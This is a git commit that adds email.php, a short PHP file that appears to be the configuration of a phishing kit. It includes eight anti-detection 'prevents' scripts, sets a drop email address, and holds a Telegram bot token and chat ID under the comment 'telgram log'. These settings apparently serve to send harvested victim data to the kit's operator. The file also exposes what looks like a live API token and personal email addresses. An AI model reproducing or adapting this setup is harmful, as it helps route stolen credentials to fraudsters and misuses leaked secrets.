fb8f6dd9ac172e6b6614f3e2482947fa0fc41059
molotof12 <areenalosood13@gmail.com>
2024-10-05 18:08:52 -0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,18 @@
+<?php
+
+include '../prevents/anti1.php';
+include '../prevents/anti2.php';
+include '../prevents/anti3.php';
+include '../prevents/anti4.php';
+include '../prevents/anti5.php';
+include '../prevents/anti6.php';
+include '../prevents/anti7.php';
+include '../prevents/anti8.php';
+
+$email ="aliabuissa100@gmail.com"; 
+
+//telgram log 
+$api="5217847855:AAEDHT9Jt2-qCZIZJRFtZl4__yvzjfFtikx";
+$chatid="-1001669468304";
+
+?>
